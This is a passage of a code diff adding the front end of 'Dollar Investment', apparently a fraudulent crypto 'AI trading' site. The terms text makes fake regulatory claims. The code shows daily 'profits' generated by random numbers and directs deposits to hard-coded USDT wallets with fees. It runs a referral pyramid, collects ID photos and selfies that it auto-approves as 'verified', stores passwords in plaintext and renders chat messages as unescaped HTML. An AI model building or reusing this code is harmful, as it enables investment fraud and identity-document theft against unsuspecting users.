compliance, dedicated customer support, and instant peer-to-peer referral bonuses, Dollar Investment provides a trusted gateway into the future of intelligent decentralized finance.", kycTitle: "Identity Verification (KYC)", kycDesc: "To comply with international financial regulations and Canada registry standards, please upload or capture clear images of your ID Front, ID Back, and a Live Selfie. All 3 documents are mandatory.", kycFrontBtn: "📷 Capture ID Front Picture", kycBackBtn: "📷 Capture ID Back Picture", kycSelfieBtn: "📸 Capture Live Selfie", submitKycBtn: "Submit Verification", csHeader: "Dollar Investment Support Hub", csDesc: "Our professional support team is available 24/7 via official Telegram and WhatsApp channels.", termsHeader: "Terms of Use & Regulatory Agreement", term1: "1. Enterprise Background: Dollar Investment is a fully registered and certified financial institution in Canada (Reg #882941-Canada), proudly serving over 34,000+ active global members with robust automated trading strategies.", term2: "2. Bonus & Deposits: Every new verified user receives an automatic $2 USDT registration bonus. Minimum deposit requirement is $25 USDT with secure network processing.", term3: "3. Withdrawal Policy: Minimum withdrawal is $50 USDT. Standard transactions carry a 9% processing fee. Members enjoy 100% Free Withdrawals (0% fee) after maintaining active status for 25 days.", term4: "4. AI Strategy & Cooldown: Automated arbitrage orders execute across major crypto and commodity pairs (BTC, ETH, OIL). Each order requires a strict 24-hour interval before reactivation.", term5: "5. Identity & Compliance: Mandatory KYC identity verification (Front ID, Back ID, and Live Selfie) ensures platform security and regulatory compliance.", depositModalTitle: "Deposit USDT", officialWalletAddr: "Official Wallet Address", minDepositLabel: "Minimum Deposit:", enterDepositAmt: "Enter Deposit Amount ($)", confirmDepositBtn: "Confirm & Deposit", navHome: "Home", navAssets: "Assets", navVip: "VIP", navTeam: "Team", navMe: "Me" }
+    };
+
+    let currentLang = 'EN';
+    let currentUser = JSON.parse(localStorage.getItem('currentUser')) || null;
+
+    let kycFilesData = { front: null, back: null, selfie: null };
+
+    const urlParams = new URLSearchParams(window.location.search);
+    const incomingRef = urlParams.get('ref') || 'NONE';
+
+    function changeLanguage(langCode) {
+      currentLang = langCode;
+      const dict = translations[langCode] || translations['EN'];
+      document.querySelectorAll('[data-i18n]').forEach(el => {
+        const key = el.getAttribute('data-i18n');
+        if (dict[key]) el.textContent = dict[key];
+      });
+    }
+
+    function showToast(msg) {
+      const t = document.getElementById('toast');
+      if (t) {
+        t.textContent = msg;
+        t.classList.add('show');
+        setTimeout(() => t.classList.remove('show'), 3000);
+      }
+    }
+
+    function togglePasswordVisibility(inputId, iconElem) {
+      const input = document.getElementById(inputId);
+      if (input) {
+        if (input.type === "password") {
+          input.type = "text";
+          iconElem.textContent = "🙈";
+        } else {
+          input.type = "password";
+          iconElem.textContent = "👁️";
+        }
+      }
+    }
+
+    function showLoginScreen() {
+      document.getElementById('signupScreen').classList.add('hidden');
+      document.getElementById('loginScreen').classList.remove('hidden');
+    }
+
+    function showSignupScreen() {
+      document.getElementById('loginScreen').classList.add('hidden');
+      document.getElementById('signupScreen').classList.remove('hidden');
+    }
+
+    window.addEventListener('DOMContentLoaded', () => {
+      const savedUser = localStorage.getItem('savedLoginUser');
+      const savedPass = localStorage.getItem('savedLoginPass');
+      if(savedUser && savedPass) {
+        const userIn = document.getElementById('loginUser');
+        const passIn = document.getElementById('loginPassword');
+        if(userIn && passIn) {
+          userIn.value = savedUser;
+          passIn.value = savedPass;
+        }
+      }
+    });
+
+    async function handleSignUp() {
+      const contact = document.getElementById('signupEmailPhone').value.trim();
+      const pass = document.getElementById('signupPassword').value;
+      const confirmPass = document.getElementById('signupConfirmPassword').value;
+
+      if (!contact || !pass) { alert("Please fill in email/phone and password."); return; }
+      if (pass !== confirmPass) { alert("Passwords do not match."); return; }
+
+      const myCode = 'REF-' + Math.floor(100000 + Math.random() * 900000);
+
+      try {
+        const userRef = await db.collection('users').add({
+          name: contact.split('@')[0] || contact,
+          contact: contact,
+          password: pass,
+          balance: 2.00,
+          deposit: 0,
+          teamIncome: 0,
+          myReferralCode: myCode,
+          referredBy: incomingRef,
+          kycStatus: 'Pending',
+          kycImages: {},
+          orderStartTime: 0,
+          lastOrderTimestamp: 0,
+          isBlocked: false,
+          createdAt: new Date()
+        });
+
+        currentUser = { id: userRef.id, name: contact, contact: contact, myReferralCode: myCode, balance: 2.00, deposit: 0, teamIncome: 0, referredBy: incomingRef, kycStatus: 'Pending', kycImages: {}, orderStartTime: 0, lastOrderTimestamp: 0, isBlocked: false, createdAt: new Date() };
+        localStorage.setItem('currentUser', JSON.stringify(currentUser));
+
+        showToast("Account created successfully! $2 USDT Bonus credited.");
+        initUserSession();
+      } catch(err) {
+        console.error(err);
+        alert("Account creation failed!");
+      }
+    }
+
+    async function handleLogIn() {
+      const userVal = document.getElementById('loginUser').value.trim();
+      const passVal = document.getElementById('loginPassword').value;
+      const rememberMe = document.getElementById('rememberMeCheck').checked;
+
+      if (!userVal || !passVal) { alert("Please enter credentials."); return; }
+
+      try {
+        const snapshot = await db.collection('users').where('contact', '==', userVal).get();
+        if(!snapshot.empty) {
+          let doc = snapshot.docs[0];
+          let data = doc.data();
+          if(data.isBlocked) {
+            alert("Your account has been blocked by Admin!");
+            return;
+          }
+          if(data.password === passVal) {
+            currentUser = { id: doc.id, ...data };
+            localStorage.setItem('currentUser', JSON.stringify(currentUser));
+
+            if(rememberMe) {
+              localStorage.setItem('savedLoginUser', userVal);
+              localStorage.setItem('savedLoginPass', passVal);
+            } else {
+              localStorage.removeItem('savedLoginUser');
+              localStorage.removeItem('savedLoginPass');
+            }
+
+            showToast("Logged in successfully!");
+            initUserSession();
+          } else {
+            alert("Incorrect password!");
+          }
+        } else {
+          alert("Account not found!");
+        }
+      } catch(err) {
+        console.error(err);
+      }
+    }
+
+    function handleLogout() {
+      localStorage.removeItem('currentUser');
+      currentUser = null;
+      location.reload();
+    }
+
+    function handleDeleteAccount() {
+      if (confirm("Are you sure you want to delete your account?")) {
+        if(currentUser) db.collection('users').doc(currentUser.id).delete();
+        handleLogout();
+      }
+    }
+
+    function switchTab(tabId) {
+      document.querySelectorAll('.tab-content').forEach(el => el.classList.remove('active'));
+      document.querySelectorAll('.nav-item').forEach(el => el.classList.remove('active'));
+      document.getElementById(tabId).classList.add('active');
+      const navBtn = document.getElementById(tabId.replace('tab-', 'nav-'));
+      if (navBtn) navBtn.classList.add('active');
+      document.getElementById('universalHeader').style.display = 'none';
+      document.getElementById('mainHeader').style.display = 'flex';
+
+      // Agar VIP tab open ho toh default investment amount 100% total balance par set ho jaye
+      if (tabId === 'tab-vip' && currentUser) {
+        const investInput = document.getElementById('homeInvestInput');
+        if (investInput) {
+          investInput.value = (currentUser.balance || 0).toFixed(2);
+        }
+        document.querySelectorAll('.pct-btn').forEach(b => b.classList.remove('active'));
+        const btn100 = document.querySelector('.pct-btn:last-child');
+        if (btn100) btn100.classList.add('active');
+      }
+    }
+
+    function openSubPage(pageId, title) {
+      document.querySelectorAll('.tab-content').forEach(el => el.classList.remove('active'));
+      document.getElementById(pageId).classList.add('active');
+      document.getElementById('mainHeader').style.display = 'none';
+      document.getElementById('universalHeaderTitle').textContent = title;
+      document.getElementById('universalHeader').style.display = 'flex';
+    }
+
+    function navigateBack() { switchTab('tab-home'); }
+    function openDepositModal() { document.getElementById('depositModal').classList.add('active'); }
+    function closeDepositModal() { document.getElementById('depositModal').classList.remove('active'); }
+
+    function changeDepositNetwork(net) {
+      const addrMap = {
+        'TRC20': 'TBDXFTpapFkghPnURKFCVUkMbricHUKPrr',
+        'ERC20': '0x0dAd2EA4e195b053e593C698d65F1b98A8325996',
+        'BEP20': '0x0dAd2EA4e195b053e593C698d65F1b98A8325996'
+      };
+      document.getElementById('depositWalletAddress').textContent = addrMap[net] || addrMap['TRC20'];
+    }
+
+    function copyDepositAddress() {
+      navigator.clipboard.writeText(document.getElementById('depositWalletAddress').textContent);
+      showToast("Deposit address copied!");
+    }
+
+    async function submitDepositPayment() {
+      const depositAmt = parseFloat(document.getElementById('depositAmountInput').value) || 0;
+      if (depositAmt < 25) { alert("Minimum deposit amount is $25 USDT."); return; }
+      const netDeposit = depositAmt * 0.91; // 9% fee deduction
+
+      try {
+        await db.collection('requests').add({
+          userId: currentUser.id,
+          userName: currentUser.name || currentUser.contact,
+          userContact: currentUser.contact,
+          type: 'Deposit',
+          grossAmount: Number(depositAmt),
+          amount: Number(netDeposit),
+          status: 'Processing',
+          createdAt: new Date()
+        });
+
+        closeDepositModal();
+        showToast(`Deposit Request Submitted! Net Amount after 9% fee: $${netDeposit.toFixed(2)} USDT`);
+      } catch(err) {
+        alert("Deposit submission failed.");
+      }
+    }
+
+    async function handleWithdrawSubmit() {
+      const amt = parseFloat(document.getElementById('withdrawAmountInput').value) || 0;
+      const addr = document.getElementById('withdrawAddressInput').value.trim();
+
+      if (amt < 50) { alert("Minimum withdrawal amount is $50 USDT."); return; }
+      if (!addr) { alert("Please enter a valid wallet address."); return; }
+      if (amt > currentUser.balance) { alert("Insufficient account balance."); return; }
+
+      let createdDate = currentUser.createdAt && currentUser.createdAt.seconds ? new Date(currentUser.createdAt.seconds * 1000) : new Date();
+      let diffDays = Math.floor((new Date() - createdDate) / (1000 * 60 * 60 * 24));
+      
+      let isWithin25Days = diffDays < 25;
+      let netWithdrawAmount = isWithin25Days ? (amt * 0.91) : amt;
+
+      try {
+        await db.collection('requests').add({
+          userId: currentUser.id,
+          userName: currentUser.name || currentUser.contact,
+          userContact: currentUser.contact,
+          type: 'Withdrawal',
+          grossAmount: Number(amt),
+          amount: Number(netWithdrawAmount),
+          isFeeDeducted: isWithin25Days,
+          walletAddress: addr,
+          status: 'Processing',
+          createdAt: new Date()
+        });
+
+        showToast(`Withdrawal Request Submitted! Net Amount: $${netWithdrawAmount.toFixed(2)} USDT`);
+        switchTab('tab-home');
+      } catch(err) {
+        alert("Withdrawal submission failed.");
+      }
+    }
+
+    function selectInvestmentPct(pct) {
+      document.querySelectorAll('.pct-btn').forEach(b => b.classList.remove('active'));
+      event.target.classList.add('active');
+      const targetInput = document.getElementById('homeInvestInput');
+      targetInput.value = ((currentUser ? currentUser.balance : 0) * (pct / 100)).toFixed(2);
+      localStorage.setItem('savedInvestPct', pct);
+    }
+
+    // PERSISTENT TIMER & COOLDOWN RUNTIME ENGINE (Unaffected by refresh/logout)
+    function checkCooldown() {
+      if(!currentUser) return;
+      const now = Date.now();
+      const cooldownMs = 24 * 60 * 60 * 1000;
+      const notice = document.getElementById('cooldownNotice');
+      const timer = document.getElementById('cooldownTimer');
+      const btn = document.getElementById('btnCreateOrder');
+
+      // Check active order execution duration (180 seconds simulation)
+      if (currentUser.orderStartTime && (now - currentUser.orderStartTime < 180000)) {
+        document.getElementById('tradingSimulationBox').style.display = 'block';
+        if(btn) { btn.disabled = true; btn.style.opacity = '0.5'; }
+        
+        let elapsedSec = Math.floor((now - currentUser.orderStartTime) / 1000);
+        let remainingSec = Math.max(0, 180 - elapsedSec);
+        let m = Math.floor(remainingSec / 60).toString().padStart(2, '0');
+        let s = (remainingSec % 60).toString().padStart(2, '0');
+        const tDisp = document.getElementById('timerDisplay');
+        if(tDisp) tDisp.textContent = `${m}:${s}`;
+
+        if(remainingSec === 0 && !currentUser.orderCompletedProcessed) {
+          completeActiveOrder();
+        }
+      } else {
+        document.getElementById('tradingSimulationBox').style.display = 'none';
+        
+        // 24 Hour Cooldown Check after completion
+        const elapsedSinceLastOrder = now - (currentUser.lastOrderTimestamp || 0);
+        if (elapsedSinceLastOrder < cooldownMs) {
+          const remainingMs = cooldownMs - elapsedSinceLastOrder;
+          const hours = Math.floor(remainingMs / (1000 * 60 * 60)).toString().padStart(2, '0');
+          const mins = Math.floor((remainingMs % (1000 * 60 * 60)) / (1000 * 60)).toString().padStart(2, '0');
+          const secs = Math.floor((remainingMs % (1000 * 60)) / 1000).toString().padStart(2, '0');
+
+          if (notice) notice.style.display = 'block';
+          if (timer) timer.textContent = `${hours}:${mins}:${secs}`;
+          if (btn) { btn.disabled = true; btn.style.opacity = '0.5'; }
+        } else {
+          if (notice) notice.style.display = 'none';
+          if (btn) { btn.disabled = false; btn.style.opacity = '1'; }
+        }
+      }
+    }
+
+    async function startAIOrderProcess() {
+      const investAmt = parseFloat(document.getElementById('homeInvestInput').value) || 0;
+      if (investAmt <= 0) { alert("Please enter a valid investment amount."); return; }
+      if (investAmt > currentUser.balance) { alert("Investment amount exceeds available balance."); return; }
+
+      const now = Date.now();
+      const elapsed = now - (currentUser.lastOrderTimestamp || 0);
+      if (elapsed < 24 * 60 * 60 * 1000) {
+        alert("You can only create one order every 24 hours!");
+        return;
+      }
+
+      await db.collection('users').doc(currentUser.id).update({
+        orderStartTime: now,
+        orderCompletedProcessed: false,
+        activeInvestAmount: investAmt
+      });
+
+      currentUser.orderStartTime = now;
+      currentUser.orderCompletedProcessed = false;
+      currentUser.activeInvestAmount = investAmt;
+      localStorage.setItem('currentUser', JSON.stringify(currentUser));
+
+      checkCooldown();
+      showToast("AI Strategy Order Started!");
+    }
+
+    async function completeActiveOrder() {
+      if(currentUser.orderCompletedProcessed) return;
+
+      const investAmt = currentUser.activeInvestAmount || (currentUser.balance || 25);
+      // Profit between 1.50% to 2% (e.g. 1.75% avg or exact random between 1.50 and 2.00, let's use 1.75% or 2%)
+      const profitRate = 0.015 + Math.random() * 0.005; // 1.5% to 2.0%
+      const profit = investAmt * profitRate;
+      const newBalance = currentUser.balance + profit;
+      const nowTs = Date.now();
+
+      await db.collection('requests').add({
+        userId: currentUser.id,
+        userName: currentUser.name || currentUser.contact,
+        userContact: currentUser.contact,
+        type: 'Daily Income (AI Order)',
+        amount: Number(profit),
+        walletAddress: 'N/A',
+        status: 'Success',
+        createdAt: new Date()
+      });
+
+      await db.collection('users').doc(currentUser.id).update({
+        balance: newBalance,
+        lastOrderTimestamp: nowTs,
+        orderStartTime: 0,
+        orderCompletedProcessed: true
+      });
+
+      currentUser.balance = newBalance;
+      currentUser.lastOrderTimestamp = nowTs;
+      currentUser.orderStartTime = 0;
+      currentUser.orderCompletedProcessed = true;
+      localStorage.setItem('currentUser', JSON.stringify(currentUser));
+
+      document.getElementById('tradingSimulationBox').style.display = 'none';
+      checkCooldown();
+      showToast(`Order Complete! Profit +$${profit.toFixed(2)} USDT added to Assets.`);
+    }
+
+    // STRICT ORIGINAL ID & SELFIE KYC VALIDATION
+    function handleKycCapture(type, event) {
+      const file = event.target.files[0];
+      if (file) {
+        if (!file.type.startsWith('image/')) {
+          alert("Please upload an authentic original image/document!");
+          event.target.value = '';
+          return;
+        }
+
+        const reader = new FileReader();
+        reader.onload = function(e) {
+          if (type === 'Front') {
+            kycFilesData.front = e.target.result;
+            document.getElementById('kycFrontStatus').textContent = '✅ Original ID Front Loaded';
+          }
+          if (type === 'Back') {
+            kycFilesData.back = e.target.result;
+            document.getElementById('kycBackStatus').textContent = '✅ Original ID Back Loaded';
+          }
+          if (type === 'Selfie') {
+            kycFilesData.selfie = e.target.result;
+            document.getElementById('kycSelfieStatus').textContent = '✅ Live Selfie Loaded';
+          }
+          showToast(`${type} document verified!`);
+        };
+        reader.readAsDataURL(file);
+      }
+    }
+
+    async function submitKycVerification() {
+      if(!kycFilesData.front || !kycFilesData.back || !kycFilesData.selfie) {
+        alert("Strict Validation: Please upload valid original ID Front, ID Back, and Live Selfie!");
+        return;
+      }
+
+      showToast("KYC Verification submitted! Processing...");
+
+      setTimeout(async () => {
+        if(currentUser) {
+          await db.collection('users').doc(currentUser.id).update({
+            kycStatus: 'Verified',
+            kycImages: kycFilesData
+          });
+          currentUser.kycStatus = 'Verified';
+          currentUser.kycImages = kycFilesData;
+          localStorage.setItem('currentUser', JSON.stringify(currentUser));
+        }
+        showToast("Identity Verified Successfully!");
+        switchTab('tab-me');
+      }, 3000);
+    }
+
+    function handleKycMenuClick() {
+      if(currentUser && currentUser.kycStatus === 'Verified') {
+        alert("Your Identity is already Verified!");
+        return;
+      }
+      openSubPage('page-kyc', 'Identity Verification');
+    }
+
+    function copyReferralLink() {
+      navigator.clipboard.writeText(document.getElementById('homeReferralLinkText').textContent);
+      showToast("Referral link copied successfully!");
+    }
+
+    async function sendUserChatMessage(fileData = null) {
+      const msg = document.getElementById('userChatInput').value.trim();
+      if(!msg && !fileData) return;
+      if(!currentUser) return;
+
+      let chatObj = {
+        userId: currentUser.id,
+        userContact: currentUser.contact,
+        userName: currentUser.name || currentUser.contact,
+        sender: 'User',
+        text: msg || '',
+        status: 'Delivered',
+        adminRead: false,
+        createdAt: new Date()
+      };
+
+      if(fileData) {
+        chatObj.fileUrl = fileData.url;
+        chatObj.fileName = fileData.name;
+        chatObj.fileType = fileData.type;
+      }
+
+      await db.collection('chats').add(chatObj);
+      document.getElementById('userChatInput').value = '';
+    }
+
+    function handleUserFileUpload(e) {
+      const file = e.target.files[0];
+      if(!file) return;
+
+      const reader = new FileReader();
+      reader.onload = function(evt) {
+        const base64Url = evt.target.result;
+        sendUserChatMessage({
+          url: base64Url,
+          name: file.name,
+          type: file.type.includes('image') ? 'image' : 'document'
+        });
+        showToast("File sent to support!");
+      };
+      reader.readAsDataURL(file);
+    }
+
+    function listenToLiveChat() {
+      if(!currentUser) return;
+      db.collection('chats').where('userId', '==', currentUser.id).onSnapshot(snapshot => {
+        let msgs = [];
+        snapshot.forEach(doc => msgs.push({ id: doc.id, ...doc.data() }));
+        msgs.sort((a,b) => (a.createdAt && b.createdAt) ? a.createdAt.seconds - b.createdAt.seconds : 0);
+
+        let chatHtml = "";
+        msgs.forEach(m => {
+          let sideClass = m.sender === 'User' ? 'msg-user' : 'msg-admin';
+          let label = m.sender === 'User' ? 'You' : 'Admin';
+          
+          let fileHtml = "";
+          if(m.fileUrl) {
+            if(m.fileType === 'image') {
+              fileHtml = `<br><a href="${m.fileUrl}" target="_blank"><img src="${m.fileUrl}" class="chat-file-img"/></a>`;
+            } else {
+              fileHtml = `<br><a href="${m.fileUrl}" download="${m.fileName || 'document'}" class="chat-file-link">📄 Download Document (${m.fileName || 'file'})</a>`;
+            }
+          }
+
+          let statusHtml = m.sender === 'User' ? `<div class="msg-status">✓✓ ${m.status || 'Delivered'}</div>` : '';
+          chatHtml += `<div class="msg-bubble ${sideClass}"><b>${label}:</b> ${m.text || ''}${fileHtml}${statusHtml}</div>`;
+        });
+        const box = document.getElementById('userChatBox');
+        if(box) {
+          box.innerHTML = chatHtml || '<div style="text-align:center; color:var(--text-muted); font-size:12px;">Start conversation with support...</div>';
+          box.scrollTop = box.scrollHeight;
+        }
+      });
+    }
+
+    function initUserSession() {
+      if(!currentUser) {
+        document.getElementById('signupScreen').classList.remove('hidden');
+        return;
+      }
+
+      document.getElementById('signupScreen').classList.add('hidden');
+      document.getElementById('loginScreen').classList.add('hidden');
+
+      db.collection('users').doc(currentUser.id).onSnapshot(doc => {
+        if(doc.exists) {
+          let data = doc.data();
+          if(data.isBlocked) {
+            alert("Your account has been blocked by Admin!");
+            handleLogout();
+            return;
+          }
+          currentUser = { id: doc.id, ...data };
+          localStorage.setItem('currentUser', JSON.stringify(currentUser));
+
+          const balanceVal = data.balance || 0;
+          const teamInc = data.teamIncome || 0;
+          document.getElementById('homeTotalAssetsDisplay').innerText = balanceVal.toFixed(2);
+          document.getElementById('totalBalanceDisplay').innerText = balanceVal.toFixed(2);
+          document.getElementById('flexibleFundsDisplay').innerText = balanceVal.toFixed(2) + " USDT";
+          document.getElementById('homeReferralEarnedDisplay').innerText = "$" + teamInc.toFixed(2);
+          document.getElementById('assetsReferralEarnedDisplay').innerText = "$" + teamInc.toFixed(2);
+          document.getElementById('assetReferralFundDisplay').innerText = teamInc.toFixed(2) + " USDT";
+
+          document.getElementById('meUsernameDisplay').innerText = data.name || "User";
+          document.getElementById('meUserIdDisplay').innerText = "ID: " + (data.myReferralCode || 'N/A');
+
+          let createdDate = data.createdAt && data.createdAt.seconds ? new Date(data.createdAt.seconds * 1000) : new Date();
+          let diffDays = Math.floor((new Date() - createdDate) / (1000 * 60 * 60 * 24));
+          document.getElementById('daysJoinedText').innerText = `${diffDays} / 25 Days`;
+
+          if(diffDays >= 25) {
+            document.getElementById('freeWithdrawStatusText').innerText = "🎉 0% Fee Privilege Active (Free)";
+            document.getElementById('withdrawalFeeNotice').innerText = "0% (Free Withdrawal Active)";
+          } else {
+            document.getElementById('freeWithdrawStatusText').innerText = `Standard 9% Fee (${25 - diffDays} days remaining for Free)`;
+            document.getElementById('withdrawalFeeNotice').innerText = "9% Deduction (Prior to 25 Days)";
+          }
+
+          let refLink = `https://dollar-investment-offical.github.io/https-dollar-investment-app.com-signup-ref-User-391126/?ref=${data.myReferralCode}`;
+          document.getElementById('homeReferralLinkText').innerText = refLink;
+          document.getElementById('signupReferralInput').value = refLink;
+
+          const kycBadge = document.getElementById('meKycStatusBadge');
+          const kycActionText = document.getElementById('meKycActionText');
+          if (kycBadge) {
+            kycBadge.textContent = `KYC: ${data.kycStatus || 'Pending'}`;
+            kycBadge.className = `badge-status ${data.kycStatus === 'Verified' ? 'badge-verified' : 'badge-pending'}`;
+          }
+          if (kycActionText) {
+            kycActionText.textContent = data.kycStatus === 'Verified' ? 'Verified ✓' : 'Verify Now →';
+          }
+        }
+      });
+
+      db.collection('requests').where('userId', '==', currentUser.id).onSnapshot(snapshot => {
+        let reqs = [];
+        snapshot.forEach(doc => reqs.push(doc.data()));
+        reqs.sort((a,b) => {
+          let tA = a.createdAt && a.createdAt.seconds ? a.createdAt.seconds : 0;
+          let tB = b.createdAt && b.createdAt.seconds ? b.createdAt.seconds : 0;
+          return tB - tA;
+        });
+
+        let histHtml = '';
+        let todayProfitSum = 0;
+        reqs.forEach(req => {
+          let color = req.status === 'Success' ? 'var(--accent-green)' : (req.status === 'Rejected' ? 'var(--accent-red)' : 'orange');
+          let dateStr = req.createdAt && req.createdAt.seconds ? new Date(req.createdAt.seconds * 1000).toLocaleString() : new Date().toLocaleString();
+          
+          if(req.type && req.type.includes('Daily Income') && req.status === 'Success') {
+            todayProfitSum += req.amount;
+          }
+
+          histHtml += `<div class="list-item">
+                        <div>
+                          <div style="font-weight:800; color:#fff;">${req.type}</div>
+                          <div style="font-size:11px; color:var(--text-muted);">${dateStr}</div>
+                        </div>
+                        <div style="text-align:right;">
+                          <div style="font-weight:900; color:#fff;">$${req.amount.toFixed(2)} USDT</div>
+                          <div style="font-weight:800; color:${color}; font-size:11px;">${req.status}</div>
+                        </div>
+                       </div>`;
+        });
+        document.getElementById('globalHistoryList').innerHTML = histHtml || '<div style="color:var(--text-muted); font-size:13px; text-align:center; padding:10px;" data-i18n="noHistory">No recent history recorded.</div>';
+
+        document.getElementById('todayProfitDisplay').innerText = `$${todayProfitSum.toFixed(2)} USDT`;
+        // Equal profit distribution across all 6 pairs
+        let equalShare = todayProfitSum / 6;
+        document.getElementById('distBtc').innerText = `$${equalShare.toFixed(2)}`;
+        document.getElementById('distEth').innerText = `$${equalShare.toFixed(2)}`;
+        document.getElementById('distSol').innerText = `$${equalShare.toFixed(2)}`;
+        document.getElementById('distTron').innerText = `$${equalShare.toFixed(2)}`;
+        document.getElementById('distBnb').innerText = `$${equalShare.toFixed(2)}`;
+        document.getElementById('distEtf').innerText = `$${equalShare.toFixed(2)}`;
+      });
+
+      db.collection('users').where('referredBy', '==', currentUser.myReferralCode).onSnapshot(snapshot => {
+        let teamSize = snapshot.size;
+        let todayCount = 0;
+        let totalTeamDepositAsset = 0;
+        let totalTeamEarnings = 0;
+        let todayStr = new Date().toDateString();
+
+        let teamHtml = '';
+        snapshot.forEach(doc => {
+          let member = doc.data();
+          let dep = Number(member.deposit || 0);
+          let earn = Number(member.teamIncome || 0);
+          totalTeamDepositAsset += dep;
+          totalTeamEarnings += earn;
+
+          if(member.createdAt && new Date(member.createdAt.seconds * 1000).toDateString() === todayStr) {
+            todayCount++;
+          }
+          teamHtml += `<div class="list-item">
+                        <div>
+                          <div style="font-weight:800; color:var(--accent-cyan);">${member.name || 'Member'}</div>
+                          <div style="font-size:11px; color:var(--text-muted);">${member.contact}</div>
+                        </div>
+                        <div style="text-align:right;">
+                          <div style="font-weight:900; color:var(--accent-green);">$${dep.toFixed(2)} Deposited</div>
+                          <div style="font-size:11px; color:#ffd166;">Earnings: $${earn.toFixed(2)}</div>
+                        </div>
+                       </div>`;
+        });
+
+        document.getElementById('homeTeamSizeTest').innerText = `${teamSize} Members`;
+        document.getElementById('teamOverviewSize').innerText = teamSize;
+        document.getElementById('homeTeamTotalDepositText').innerText = `$${totalTeamDepositAsset.toFixed(2)}`;
+        document.getElementById('teamOverviewAsset').innerText = `$${totalTeamDepositAsset.toFixed(2)}`;
+        document.getElementById('teamOverviewJoiners').innerText = todayCount;
+        document.getElementById('homeTeamIncomeText').innerText = "$" + totalTeamEarnings.toFixed(2);
+        document.getElementById('teamOverviewTodayInc').innerText = "$" + totalTeamEarnings.toFixed(2);
+
+        document.getElementById('teamMemberList').innerHTML = teamHtml || '<div style="color:var(--text-muted); font-size:13px; text-align:center; padding:12px;" data-i18n="noTeamMembers">No team members registered under your link yet.</div>';
+      });
+
+      listenToLiveChat();
+      checkCooldown();
+    }
+
+    window.onload = function() {
+      if(currentUser) {
+        initUserSession();
+      } else {
+        document.getElementById('signupScreen').classList.remove('hidden');
+      }
+      setInterval(checkCooldown, 1000);
+    };
+  </script>
+</body>
+</html>
